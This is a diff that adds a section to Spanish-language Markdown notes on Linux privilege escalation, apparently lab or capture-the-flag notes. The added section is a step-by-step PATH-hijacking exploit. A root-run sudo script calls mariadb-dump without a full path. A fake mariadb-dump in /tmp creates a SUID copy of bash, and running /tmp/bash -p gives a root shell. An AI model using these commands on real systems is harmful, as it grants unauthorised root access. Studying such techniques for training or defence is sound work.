@@ -72,3 +72,37 @@ Una vez modificada la ruta, al momento de volver a ejecutar el archivo **'test'*
 -rwxrwxr-x 1 omar omar 8756 Feb 7 2022 whoami
 ```
 
+--- 
+
+## Script personalizado (DbMaria)
+
+```bash 
+Paso 1:
+❯ sudo -l 
+	(root) NOPASSWD: /opt/backup/DbMaria    # Ejecutar el script como root 
+
+❯ strings /opt/backup/DbMaria
+	mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s > /tmp/backup.sql      # Mirar parte del contenido del script original 
+```
+
+```bash 
+Paso 2:
+❯ nvim /tmp/mariadb-dump   # Crear el script en el dir /tmp
+
+# Contenido del script 
+	#!/bin/bash
+	cp /bin/bash /tmp/bash
+	chmod +xs /tmp/bash
+
+❯ chmod +x /tmp/mariadb-dump  # Dar permisos de ejecución al script
+```
+
+```bash 
+Paso 3:
+❯ export PATH=/tmp:$PATH           # Modificar el PATH para que inicie en /tmp 
+
+❯ sudo /opt/backup/DbMaria /tmp/test    # Ejecutar el script 
+❯ ls -lah /tmp/bash                # Mirar si cambio la '/bash' y se le agrego el permiso 'S'
+
+❯ /tmp/bash -p                     # Ejecutar la '/bash' y ser root
+```
